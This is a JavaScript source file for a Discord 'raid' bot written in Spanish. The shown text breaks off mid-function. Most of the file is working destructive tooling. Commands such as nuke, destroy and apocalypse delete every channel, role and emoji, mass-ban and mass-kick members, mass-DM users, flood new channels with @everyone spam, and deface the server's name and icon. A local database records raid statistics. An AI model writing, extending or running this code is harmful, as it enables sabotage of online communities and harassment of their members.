require('dotenv').config();
const keepAlive = require('./keep_alive.js');
keepAlive();

const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  AttachmentBuilder,
  ChannelType,
  PermissionFlagsBits,
  Collection
} = require('discord.js');
const fs = require('fs');
const path = require('path');

// ==================== CONFIGURACIÓN AVANZADA ====================

const CONFIG = {
  DISCORD_TOKEN: process.env.DISCORD_TOKEN,
  ASSETS_DIR: './attached_assets',
  LOGS_DIR: './logs',
  DATABASE_FILE: './database.json',
  ICON_FILE: '40fd13ae2d1126651d55d5411b28b65f_1768104286084.png',
  TRIANGULITO_FILE: 'images.webp',
  BATCH_SIZE: 10,
  SPAM_COUNT: 20,
  MAX_CHANNELS: 150,
  CONCURRENCY: 5,
  RATE_LIMIT: {
    WINDOW_MS: 60000,
    MAX_REQUESTS: 10
  },
  CACHE_TTL: 3600000,
  TIMEOUT_MS: 30000,
  MAX_RETRIES: 3,
  RETRY_DELAY: 1000,
  OWNER_ID: process.env.OWNER_ID || null,
  PREFIX: '.',
  VERSION: '4.0',
  DEBUG_MODE: process.env.DEBUG_MODE === 'true'
};

// ==================== SISTEMA DE LOGGING ====================

class Logger {
  constructor() {
    this.logs = [];
    this.ensureLogsDir();
  }

  ensureLogsDir() {
    if (!fs.existsSync(CONFIG.LOGS_DIR)) {
      fs.mkdirSync(CONFIG.LOGS_DIR, { recursive: true });
    }
  }

  getTimestamp() {
    return new Date().toISOString();
  }

  log(level, message, data = null) {
    const logEntry = {
      timestamp: this.getTimestamp(),
      level,
      message,
      data: data || {}
    };

    this.logs.push(logEntry);

    const logColor = {
      'INFO': '\x1b[36m',
      'WARN': '\x1b[33m',
      'ERROR': '\x1b[31m',
      'SUCCESS': '\x1b[32m',
      'DEBUG': '\x1b[35m'
    };

    const reset = '\x1b[0m';
    const color = logColor[level] || '\x1b[37m';
    
    console.log(`${color}[${level}]${reset} ${this.getTimestamp()} - ${message}`, data || '');

    if (level === 'ERROR' || level === 'WARN') {
      this.writeToFile(level, message, data);
    }

    if (this.logs.length > 1000) {
      this.logs.shift();
    }
  }

  writeToFile(level, message, data) {
    const filename = path.join(CONFIG.LOGS_DIR, `${level.toLowerCase()}-${new Date().toISOString().split('T')[0]}.log`);
    const logEntry = `[${this.getTimestamp()}] ${message}\n${JSON.stringify(data)}\n---\n`;
    fs.appendFileSync(filename, logEntry);
  }

  info(msg, data) { this.log('INFO', msg, data); }
  warn(msg, data) { this.log('WARN', msg, data); }
  error(msg, data) { this.log('ERROR', msg, data); }
  success(msg, data) { this.log('SUCCESS', msg, data); }
  debug(msg, data) { if (CONFIG.DEBUG_MODE) this.log('DEBUG', msg, data); }
}

const logger = new Logger();

// ==================== SISTEMA DE BASE DE DATOS LOCAL ====================

class Database {
  constructor(filename) {
    this.filename = filename;
    this.data = this.load();
  }

  load() {
    try {
      if (!fs.existsSync(this.filename)) {
        const defaultData = {
          commands: [],
          raidStats: [],
          users: {},
          guilds: {},
          favorites: [],
          settings: {},
          warns: []
        };
        fs.writeFileSync(this.filename, JSON.stringify(defaultData, null, 2));
        return defaultData;
      }
      const content = fs.readFileSync(this.filename, 'utf-8');
      return JSON.parse(content);
    } catch (err) {
      logger.error('Error cargando base de datos', { error: err.message });
      return { commands: [], raidStats: [], users: {}, guilds: {}, favorites: [], settings: {}, warns: [] };
    }
  }

  save() {
    try {
      fs.writeFileSync(this.filename, JSON.stringify(this.data, null, 2));
    } catch (err) {
      logger.error('Error guardando base de datos', { error: err.message });
    }
  }

  addCommand(cmd, user, guild) {
    this.data.commands.push({
      command: cmd,
      user,
      guild,
      timestamp: new Date().toISOString()
    });
    this.save();
  }

  addRaidStat(guildId, action, count) {
    this.data.raidStats.push({
      guildId,
      action,
      count,
      timestamp: new Date().toISOString()
    });
    this.save();
  }

  getUserStats(userId) {
    return this.data.users[userId] || { commands: 0, raids: 0, level: 1, reputation: 0 };
  }

  updateUserStats(userId, stats) {
    this.data.users[userId] = { ...this.getUserStats(userId), ...stats };
    this.save();
  }

  getGuildStats(guildId) {
    return this.data.guilds[guildId] || { raidCount: 0, lastRaid: null, created: new Date().toISOString(), settings: {} };
  }

  updateGuildStats(guildId, stats) {
    this.data.guilds[guildId] = { ...this.getGuildStats(guildId), ...stats };
    this.save();
  }

  addFavorite(userId, guildId) {
    if (!this.data.favorites) this.data.favorites = [];
    if (!this.data.favorites.find(f => f.user === userId && f.guild === guildId)) {
      this.data.favorites.push({ user: userId, guild: guildId, timestamp: new Date().toISOString() });
      this.save();
    }
  }

  removeFavorite(userId, guildId) {
    if (this.data.favorites) {
      this.data.favorites = this.data.favorites.filter(f => !(f.user === userId && f.guild === guildId));
      this.save();
    }
  }

  addWarn(userId, reason) {
    if (!this.data.warns) this.data.warns = [];
    this.data.warns.push({
      user: userId,
      reason,
      timestamp: new Date().toISOString()
    });
    this.save();
  }

  getWarns(userId) {
    if (!this.data.warns) return [];
    return this.data.warns.filter(w => w.user === userId);
  }
}

const database = new Database(CONFIG.DATABASE_FILE);

// ==================== SISTEMA DE RATE LIMITING ====================

class RateLimiter {
  constructor() {
    this.limits = new Collection();
  }

  check(userId) {
    const now = Date.now();
    const userLimit = this.limits.get(userId) || { requests: 0, resetTime: now + CONFIG.RATE_LIMIT.WINDOW_MS };

    if (now > userLimit.resetTime) {
      return { allowed: true, remaining: CONFIG.RATE_LIMIT.MAX_REQUESTS };
    }

    if (userLimit.requests >= CONFIG.RATE_LIMIT.MAX_REQUESTS) {
      return { allowed: false, resetIn: userLimit.resetTime - now };
    }

    userLimit.requests++;
    this.limits.set(userId, userLimit);
    return { allowed: true, remaining: CONFIG.RATE_LIMIT.MAX_REQUESTS - userLimit.requests };
  }

  reset(userId) {
    this.limits.delete(userId);
  }
}

const rateLimiter = new RateLimiter();

// ==================== SISTEMA DE CACHÉ ====================

class Cache {
  constructor() {
    this.cache = new Map();
  }

  set(key, value, ttl = CONFIG.CACHE_TTL) {
    const expireTime = Date.now() + ttl;
    this.cache.set(key, { value, expireTime });
  }

  get(key) {
    const item = this.cache.get(key);
    if (!item) return null;

    if (Date.now() > item.expireTime) {
      this.cache.delete(key);
      return null;
    }

    return item.value;
  }

  clear() {
    this.cache.clear();
  }

  has(key) {
    return this.get(key) !== null;
  }

  delete(key) {
    this.cache.delete(key);
  }

  size() {
    return this.cache.size;
  }
}

const cache = new Cache();

// ==================== UTILIDADES AVANZADAS ====================

class BotUtils {
  static loadBuffer(filename) {
    try {
      const cacheKey = `buffer_${filename}`;
      const cached = cache.get(cacheKey);
      if (cached) return cached;

      const filepath = path.join(CONFIG.ASSETS_DIR, filename);
      if (!fs.existsSync(filepath)) {
        logger.warn(`Archivo no encontrado: ${filepath}`);
        return null;
      }
      
      const buffer = fs.readFileSync(filepath);
      cache.set(cacheKey, buffer, CONFIG.CACHE_TTL);
      return buffer;
    } catch (err) {
      logger.error(`Error cargando ${filename}`, { error: err.message });
      return null;
    }
  }

  static async batchExecute(items, concurrency, fn, label = 'Operación') {
    const results = [];
    const failed = [];
    const total = items.length;
    let completed = 0;

    try {
      for (let i = 0; i < items.length; i += concurrency) {
        const batch = items.slice(i, i + concurrency);
        const batchResults = await Promise.allSettled(batch.map(fn));
        
        batchResults.forEach((result, idx) => {
          if (result.status === 'fulfilled') {
            results.push(result.value);
          } else {
            failed.push({ item: batch[idx], error: result.reason });
          }
          completed++;
        });

        const progress = Math.round((completed / total) * 100);
        logger.debug(`${label} - Progreso: ${progress}%`);
      }

      logger.success(`${label} completado`, { total, completed, failed: failed.length });
      return { results, failed };
    } catch (err) {
      logger.error(`Error en batchExecute para ${label}`, { error: err.message });
      return { results, failed };
    }
  }

  static async deleteAllChannels(guild) {
    try {
      const channels = await guild.channels.fetch();
      const result = await this.batchExecute(
        [...channels.values()],
        CONFIG.CONCURRENCY,
        c => c.delete().catch(() => {}),
        'Eliminación de canales'
      );

      database.addRaidStat(guild.id, 'delete_channels', result.results.length);
      logger.success(`Canales eliminados: ${result.results.length}/${channels.size}`, { guildId: guild.id });
      return result;
    } catch (err) {
      logger.error('Error eliminando canales', { error: err.message, guildId: guild.id });
      throw err;
    }
  }

  static async createChannels(guild, name, count) {
    try {
      const created = [];
      const failed = [];

      for (let i = 0; i < count; i += CONFIG.BATCH_SIZE) {
        const size = Math.min(CONFIG.BATCH_SIZE, count - i);
        const batch = await Promise.allSettled(
          Array.from({ length: size }, () =>
            guild.channels.create({ 
              name, 
              type: ChannelType.GuildText,
              topic: `Creado por bot-raid v${CONFIG.VERSION}`
            })
          )
        );

        batch.forEach(r => {
          if (r.status === 'fulfilled' && r.value) {
            created.push(r.value);
          } else {
            failed.push(r.reason);
          }
        });
      }

      database.addRaidStat(guild.id, 'create_channels', created.length);
      logger.success(`Canales creados: ${created.length}`, { guildId: guild.id });
      return { channels: created, failed };
    } catch (err) {
      logger.error('Error creando canales', { error: err.message, guildId: guild.id });
      return { channels: [], failed: [] };
    }
  }

  static async spamChannels(channels, msgCount, messageBuilder, delay = 100) {
    try {
      let totalSpammed = 0;
      const failedChannels = [];
      const validChannels = channels.filter(c => c && c.isTextBased());

      for (let i = 0; i < msgCount; i++) {
        const sendPromises = validChannels.map(channel => 
          channel.send(messageBuilder())
            .then(() => totalSpammed++)
            .catch(err => {
              if (err.code !== 50013) {
                logger.debug('Error enviando mensaje', { error: err.message, channelId: channel.id });
              }
              failedChannels.push(channel.id);
            })
        );

        await Promise.allSettled(sendPromises);
        logger.debug(`Ronda ${i + 1}/${msgCount} completada`, { channelsCount: validChannels.length });
        
        if (i < msgCount - 1) {
          await this.sleep(delay);
        }
      }

      if (validChannels[0]?.guild?.id) {
        database.addRaidStat(validChannels[0].guild.id, 'spam', totalSpammed);
      }
      logger.success(`Spam completado: ${totalSpammed} mensajes en ${validChannels.length} canales`, { failed: failedChannels.length });
      return totalSpammed;
    } catch (err) {
      logger.error('Error en spam', { error: err.message });
      return 0;
    }
  }

  static async deleteAllRoles(guild) {
    try {
      const roles = await guild.roles.fetch();
      const toDelete = roles.filter(r => 
        r.editable && 
        r.name !== '@everyone' && 
        !r.managed
      );

      const result = await this.batchExecute(
        [...toDelete.values()],
        CONFIG.CONCURRENCY,
        r => r.delete().catch(() => {}),
        'Eliminación de roles'
      );

      database.addRaidStat(guild.id, 'delete_roles', result.results.length);
      logger.success(`Roles eliminados: ${result.results.length}`);
      return result;
    } catch (err) {
      logger.error('Error eliminando roles', { error: err.message });
      throw err;
    }
  }

  static async deleteAllEmojis(guild) {
    try {
      const [emojis, stickers] = await Promise.all([
        guild.emojis.fetch().catch(() => new Collection()),
        guild.stickers.fetch().catch(() => new Collection())
      ]);

      const items = [...emojis.values(), ...stickers.values()];
      const result = await this.batchExecute(
        items,
        CONFIG.CONCURRENCY,
        item => item.delete().catch(() => {}),
        'Eliminación de emojis y stickers'
      );

      database.addRaidStat(guild.id, 'delete_emojis', result.results.length);
      logger.success(`Emojis/Stickers eliminados: ${result.results.length}`);
      return result;
    } catch (err) {
      logger.error('Error eliminando emojis', { error: err.message });
      throw err;
    }
  }

  static async dmAllMembers(guild, message) {
    try {
      const members = await guild.members.fetch({ limit: null });
      const humanMembers = members.filter(m => !m.user.bot);

      const result = await this.batchExecute(
        [...humanMembers.values()],
        CONFIG.CONCURRENCY,
        m => m.send({ content: message }).catch(() => {}),
        'Envío de DMs'
      );

      database.addRaidStat(guild.id, 'dm_members', result.results.length);
      logger.success(`DMs enviados: ${result.results.length}/${humanMembers.size}`);
      return result;
    } catch (err) {
      logger.error('Error enviando DMs', { error: err.message });
      throw err;
    }
  }

  static async banAllMembers(guild, client) {
    try {
      const members = await guild.members.fetch({ force: true, limit: null });
      const bannable = members.filter(m => 
        m.bannable && 
        m.id !== client.user.id && 
        !m.user.bot
      );

      const result = await this.batchExecute(
        [...bannable.values()],
        CONFIG.CONCURRENCY,
        m => m.ban({ 
          deleteMessageSeconds: 604800, 
          reason: `Raideado por ${client.user.username} v${CONFIG.VERSION}` 
        }).catch(() => {}),
        'Baneo masivo'
      );

      database.addRaidStat(guild.id, 'ban_members', result.results.length);
      logger.success(`Miembros baneados: ${result.results.length}/${bannable.size}`);
      return result;
    } catch (err) {
      logger.error('Error baneando miembros', { error: err.message });
      throw err;
    }
  }

  static async renameAllChannels(guild, name) {
    try {
      const channels = await guild.channels.fetch();
      const result = await this.batchExecute(
        [...channels.values()],
        CONFIG.CONCURRENCY,
        c => c.setName(name.substring(0, 100)).catch(() => {}),
        'Renombrado de canales'
      );

      database.addRaidStat(guild.id, 'rename_channels', result.results.length);
      logger.success(`Canales renombrados: ${result.results.length}`);
      return result;
    } catch (err) {
      logger.error('Error renombrando canales', { error: err.message });
      throw err;
    }
  }

  static async kickAllMembers(guild, client) {
    try {
      const members = await guild.members.fetch({ force: true, limit: null });
      const kickable = members.filter(m => 
        m.kickable && 
        m.id !== client.user.id && 
        !m.user.bot
      );

      const result = await this.batchExecute(
        [...kickable.values()],
        CONFIG.CONCURRENCY,
        m => m.kick(`Raideado por ${client.user.username}`).catch(() => {}),
        'Expulsión masiva'
      );

      database.addRaidStat(guild.id, 'kick_members', result.results.length);
      logger.success(`Miembros expulsados: ${result.results.length}/${kickable.size}`);
      return result;
    } catch (err) {
      logger.error('Error expulsando miembros', { error: err.message });
      throw err;
    }
  }

  static async createCategories(guild, categories) {
    try {
      const created = [];
      const result = await this.batchExecute(
        categories,
        CONFIG.CONCURRENCY,
        cat => guild.channels.create({
          name: cat.name.substring(0, 100),
          type: ChannelType.GuildCategory
        }).catch(() => {}),
        'Creación de categorías'
      );

      logger.success(`Categorías creadas: ${result.results.length}`);
      return result.results;
    } catch (err) {
      logger.error('Error creando categorías', { error: err.message });
      return [];
    }
  }

  static async sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
  }

  static getRandomColor() {
    return Math.floor(Math.random() * 16777215);
  }

  static async withRetry(fn, maxRetries = CONFIG.MAX_RETRIES, delay = CONFIG.RETRY_DELAY) {
    for (let i = 0; i < maxRetries; i++) {
      try {
        return await fn();
      } catch (err) {
        if (i === maxRetries - 1) throw err;
        logger.debug(`Reintentando... ${i + 1}/${maxRetries}`);
        await this.sleep(delay);
      }
    }
  }

  static generateRandomString(length = 10) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  static generateSpamMessages(count, type = 'random') {
    const templates = {
      random: ['🚨', '💥', '🔴', '⚠️', '🎊', '🎉', '😈', '👿', '💀', '☠️'],
      urls: ['https://example.com', 'https://raid.com', 'https://discord.gg/invalid', 'https://malicious.net'],
      text: ['SPAM', 'RAID', 'PWNED', 'HACKED', 'OWNED', 'REKT', 'DESTROYED', 'BOOM', 'BANG']
    };
    
    const messages = [];
    const template = templates[type] || templates.random;
    
    for (let i = 0; i < count; i++) {
      messages.push(template[Math.floor(Math.random() * template.length)]);
    }
    return messages;
  }
}

// ==================== EMBEDS PREDEFINIDOS ====================

const EMBEDS = {
  invasion: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('⚠️ INVASIÓN EN CURSO')
    .setDescription('⚠️ PARCE QUE TUNG TUNG SAHUR ESTA DOMINANDO EL SERVER\n**¡TODOS SALGANSE AHORAA!**')
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  triangulito: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('👑 TRIANGULITO ES EL MEJOR')
    .setDescription('**¡HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO!**')
    .setImage('attachment://triangulito.webp')
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  error: (message) => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('❌ Error')
    .setDescription(message)
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  success: (message) => new EmbedBuilder()
    .setColor(0x00FF00)
    .setTitle('✅ Operación exitosa')
    .setDescription(message)
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  warning: (message) => new EmbedBuilder()
    .setColor(0xFFFF00)
    .setTitle('⚠️ Advertencia')
    .setDescription(message)
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  help: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('📋 MENÚ DE AYUDA - Bot Raid v4.0')
    .setDescription('**Comandos disponibles: 60+**')
    .addFields(
      { name: '🔴 DESTRUCTIVOS', value: '`.diversion` | `.destroy` | `.nuke` | `.chaos` | `.apocalypse` | `.delete` | `.purge`', inline: false },
      { name: '🛠️ CONSTRUCCIÓN', value: '`.createchannel` | `.createspam` | `.createcategory` | `.buildserver` | `.massrename`', inline: false },
      { name: '🎨 PERSONALIZACIÓN', value: '`.rename` | `.setbanner` | `.setnick` | `.seticon` | `.settheme` | `.customize`', inline: false },
      { name: '📊 INFORMACIÓN', value: '`.stats` | `.info` | `.profile` | `.guildinfo` | `.botinfo` | `.serverdata`', inline: false },
      { name: '🎭 ENTRETENIMIENTO', value: '`.meme` | `.joke` | `.fact` | `.trivia` | `.quote` | `.poem` | `.ascii`', inline: false },
      { name: '🎵 MÚSICA', value: '`.lyric` | `.song` | `.artist` | `.spotify` | `.playlist`', inline: false },
      { name: '📡 COMUNICACIÓN', value: '`.md` | `.broadcast` | `.announce` | `.ping` | `.echo` | `.say`', inline: false },
      { name: '💼 UTILIDADES', value: '`.backup` | `.restore` | `.favorite` | `.unfavorite` | `.clear` | `.uptime` | `.version`', inline: false },
      { name: '🎯 HERRAMIENTAS', value: '`.calculate` | `.translate` | `.weather` | `.time` | `.random` | `.dice` | `.card`', inline: false },
      { name: '👤 USUARIOS', value: '`.warn` | `.warns` | `.reputation` | `.level` | `.rank`', inline: false }
    )
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION} - Por Triangulito The Goat` }),

  stats: (data) => new EmbedBuilder()
    .setColor(0x0099FF)
    .setTitle('📊 Estadísticas')
    .addFields(
      { name: '📦 Cache', value: `${data.cacheSize} items`, inline: true },
      { name: '💾 Base de datos', value: `${data.dbCommands} comandos registrados`, inline: true },
      { name: '⏱️ Uptime', value: data.uptime, inline: true },
      { name: '💾 Memoria', value: data.memory, inline: true },
      { name: '🔴 Raids totales', value: `${data.raidCount}`, inline: true },
      { name: '🌍 Servidores', value: `${data.guilds}`, inline: true },
      { name: '👥 Usuarios en caché', value: `${data.users}`, inline: true },
      { name: '📅 Fecha', value: new Date().toLocaleString('es-ES'), inline: true }
    )
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  info: (client) => new EmbedBuilder()
    .setColor(0x00FF00)
    .setTitle('ℹ️ Información del Bot')
    .addFields(
      { name: 'Versión', value: CONFIG.VERSION, inline: true },
      { name: 'Token', value: CONFIG.DISCORD_TOKEN ? '✅ Configurado' : '❌ No configurado', inline: true },
      { name: 'Modo Debug', value: CONFIG.DEBUG_MODE ? '🔴 Activado' : '🟢 Desactivado', inline: true },
      { name: 'Servidores', value: `${client.guilds.cache.size}`, inline: true },
      { name: 'Usuario Bot', value: `${client.user.tag}`, inline: true },
      { name: 'ID del Bot', value: client.user.id, inline: true },
      { name: 'Creado', value: new Date(client.user.createdTimestamp).toLocaleString('es-ES'), inline: true },
      { name: 'Prefix', value: CONFIG.PREFIX, inline: true }
    )
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` })
};

// ==================== COMANDOS ====================

const COMMANDS = {
  // COMANDOS DESTRUCTIVOS
  async diversion(message, guild, client, args) {
    try {
      logger.info('Ejecutando comando: diversion');
      
      await message.reply({ embeds: [EMBEDS.warning('🚀 Iniciando operación diversion...')] }).catch(() => {});
      
      await BotUtils.deleteAllChannels(guild);
      const { channels: newChannels } = await BotUtils.createChannels(guild, 'TRIANGULITO THE GOAT', CONFIG.MAX_CHANNELS);
      
      const msgCount = Math.min(CONFIG.SPAM_COUNT, args[0] ? parseInt(args[0]) : CONFIG.SPAM_COUNT);
      await BotUtils.spamChannels(newChannels, msgCount, () => ({
        content: '@everyone',
        embeds: [EMBEDS.invasion()]
      }), 50);

      await Promise.all([
        guild.setName('TRIANGULITO GOAT').catch(() => {}),
        BUFFERS.icon ? guild.setIcon(BUFFERS.icon).catch(() => {}) : null
      ]);

      database.updateGuildStats(guild.id, { lastRaid: new Date().toISOString(), raidCount: (database.getGuildStats(guild.id).raidCount || 0) + 1 });
      database.addCommand('diversion', message.author.id, guild.id);
      
      logger.success('Comando diversion completado', { guildId: guild.id });
    } catch (err) {
      logger.error('Error en comando diversion', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error ejecutando diversion')] }).catch(() => {});
    }
  },

  async destroy(message, guild, client, args) {
    try {
      logger.info('Ejecutando comando: destroy');
      await message.reply({ embeds: [EMBEDS.warning('💥 INICIANDO DESTRUCCIÓN TOTAL...')] }).catch(() => {});
      
      await BotUtils.deleteAllChannels(guild);
      await BotUtils.deleteAllRoles(guild);
      await BotUtils.deleteAllEmojis(guild);
      
      const { channels: newChannels } = await BotUtils.createChannels(guild, '💀-DESTROYED-💀', 50);
      await BotUtils.spamChannels(newChannels, 15, () => ({ content: '@everyone 💀 DESTROYED 💀', embeds: [EMBEDS.invasion()] }), 30);
      await guild.setName('💀 DESTROYED BY BOT RAID 💀').catch(() => {});

      database.addCommand('destroy', message.author.id, guild.id);
      database.addRaidStat(guild.id, 'destroy', 1);
      logger.success('Comando destroy completado');
    } catch (err) {
      logger.error('Error en comando destroy', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error en destroy')] }).catch(() => {});
    }
  },

  async nuke(message, guild, client, args) {
    try {
      logger.info('Ejecutando comando: nuke');
      await message.reply({ embeds: [EMBEDS.warning('☢️ INICIANDO PROTOCOLO NUCLEAR...')] }).catch(() => {});
      
      const channels = await guild.channels.fetch();
      await BotUtils.batchExecute([...channels.values()], CONFIG.CONCURRENCY, c => c.delete().catch(() => {}), 'Eliminación nuclear');

      const category = await guild.channels.create({ name: '☢️-NUCLEAR-ZONE-☢️', type: ChannelType.GuildCategory });

      for (let i = 0; i < 50; i++) {
        await guild.channels.create({ name: '☢️-nuke-' + i, type: ChannelType.GuildText, parent: category.id }).catch(() => {});
      }

      const nukeChan = await guild.channels.create({ name: '☢️-SPAM-ZONE', type: ChannelType.GuildText, parent: category.id });

      for (let i = 0; i < 50; i++) {
        await nukeChan.send('☢️ NUCLEAR STRIKE ☢️').catch(() => {});
        await BotUtils.sleep(50);
      }

      await guild.setName('☢️ NUKED ☢️').catch(() => {});
      database.addCommand('nuke', message.author.id, guild.id);
      database.addRaidStat(guild.id, 'nuke', 1);
      logger.success('Comando nuke completado');
    } catch (err) {
      logger.error('Error en comando nuke', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error en nuke')] }).catch(() => {});
    }
  },

  async chaos(message, guild, client, args) {
    try {
      logger.info('Ejecutando comando: chaos');
      await message.reply({ embeds: [EMBEDS.warning('🌪️ DESATANDO EL CAOS...')] }).catch(() => {});
      
      await BotUtils.deleteAllChannels(guild);
      
      for (let i = 0; i < 30; i++) {
        const randomName = BotUtils.generateRandomString(8);
        await guild.channels.create({ name: randomName, type: Math.random() > 0.5 ? ChannelType.GuildText : ChannelType.GuildVoice }).catch(() => {});
      }

      database.addCommand('chaos', message.author.id, guild.id);
      logger.success('Comando chaos completado');
    } catch (err) {
      logger.error('Error en comando chaos', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error en chaos')] }).catch(() => {});
    }
  },

  async apocalypse(message, guild, client, args) {
    try {
      logger.info('Ejecutando comando: apocalypse');
      await message.reply({ embeds: [EMBEDS.warning('💀 APOCALIPSIS ACTIVADA...')] }).catch(() => {});
      
      await BotUtils.deleteAllChannels(guild);
      await BotUtils.deleteAllRoles(guild);
      await BotUtils.deleteAllEmojis(guild);
      
      await guild.setName('🌍 END OF TIMES 🌍').catch(() => {});
      
      for (let i = 0; i < 75; i++) {
        await guild.channels.create({ name: `apocalypse-${i}`, type: ChannelType.GuildText }).catch(() => {});
      }

      database.addCommand('apocalypse', message.author.id, guild.id);
      logger.success('Comando apocalypse completado');
    } catch (err) {
      logger.error('Error en comando apocalypse', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error en apocalypse')] }).catch(() => {});
    }
  },

  async delete(message, guild, client, args) {
    try {
      const target = args[0];
      if (!target) return message.reply({ embeds: [EMBEDS.error('Especifica qué eliminar: channels, roles, emojis')] });

      if (target.toLowerCase() === 'channels') {
        await BotUtils.deleteAllChannels(guild);
      } else if (target.toLowerCase() === 'roles') {
        await BotUtils.deleteAllRoles(guild);
      } else if (target.toLowerCase() === 'emojis') {
        await BotUtils.deleteAllEmojis(guild);
      }

      database.addCommand('delete', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ ${target} eliminados`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando delete', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error eliminando')] }).catch(() => {});
    }
  },

  async purge(message, guild, client, args) {
    try {
      const count = parseInt(args[0]) || 50;
      let deleted = 0;

      const messages = await message.channel.messages.fetch({ limit: count });
      for (const msg of messages.values()) {
        await msg.delete().catch(() => {});
        deleted++;
        await BotUtils.sleep(30);
      }

      database.addCommand('purge', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ ${deleted} mensajes eliminados`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando purge', { error: err.message });
    }
  },

  // COMANDOS DE CONSTRUCCIÓN
  async createchannel(message, guild, client, args) {
    try {
      const channelName = args.join(' ') || 'nuevo-canal';
      const channel = await guild.channels.create({ name: channelName.substring(0, 100), type: ChannelType.GuildText });
      database.addCommand('createchannel', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ Canal creado: #${channel.name}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando createchannel', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error creando canal')] }).catch(() => {});
    }
  },

  async createspam(message, guild, client, args) {
    try {
      const count = parseInt(args[0]) || 10;
      for (let i = 0; i < count; i++) {
        await guild.channels.create({ name: `spam-${i}`, type: ChannelType.GuildText }).catch(() => {});
        await BotUtils.sleep(100);
      }
      database.addCommand('createspam', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ ${count} canales creados`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando createspam', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error creando spam')] }).catch(() => {});
    }
  },

  async createcategory(message, guild, client, args) {
    try {
      const catName = args.join(' ') || 'Nueva Categoría';
      const category = await guild.channels.create({ name: catName.substring(0, 100), type: ChannelType.GuildCategory });
      database.addCommand('createcategory', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ Categoría creada: ${category.name}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando createcategory', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error creando categoría')] }).catch(() => {});
    }
  },

  async buildserver(message, guild, client, args) {
    try {
      const categories = [
        { name: '📢 INFORMACIÓN', channels: [{ name: 'bienvenidas', type: ChannelType.GuildText }, { name: 'reglas', type: ChannelType.GuildText }, { name: 'anuncios', type: ChannelType.GuildText }] },
        { name: '💬 GENERAL', channels: [{ name: 'chat-general', type: ChannelType.GuildText }, { name: 'fotos', type: ChannelType.GuildText }, { name: 'comandos', type: ChannelType.GuildText }] },
        { name: '🎤 VOCAL', channels: [{ name: 'General', type: ChannelType.GuildVoice }, { name: 'Música', type: ChannelType.GuildVoice }, { name: 'Gaming', type: ChannelType.GuildVoice }] }
      ];

      for (const catData of categories) {
        try {
          const category = await guild.channels.create({ name: catData.name, type: ChannelType.GuildCategory });
          for (const ch of catData.channels) {
            await guild.channels.create({ name: ch.name, type: ch.type, parent: category.id }).catch(() => {});
          }
        } catch (err) {
          logger.warn(`Error creando categoría ${catData.name}`);
        }
      }

      database.addCommand('buildserver', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success('✅ Servidor construido')] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando buildserver', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error construyendo servidor')] }).catch(() => {});
    }
  },

  async massrename(message, guild, client, args) {
    try {
      const newName = args.join(' ') || 'renamed';
      const channels = await guild.channels.fetch();
      await BotUtils.batchExecute([...channels.values()], CONFIG.CONCURRENCY, c => c.setName(newName.substring(0, 100)).catch(() => {}), 'Renombrado masivo');
      database.addCommand('massrename', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ Canales renombrados a ${newName}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando massrename', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error renombrando')] }).catch(() => {});
    }
  },

  // COMANDOS DE PERSONALIZACIÓN
  async rename(message, guild, client, args) {
    try {
      const name = args.join(' ');
      if (!name) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un nombre')] });
      await guild.setName(name.substring(0, 100));
      database.addCommand('rename', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ Servidor renombrado a: ${name}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando rename', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error renombrando servidor')] }).catch(() => {});
    }
  },

  async setbanner(message, guild, client, args) {
    try {
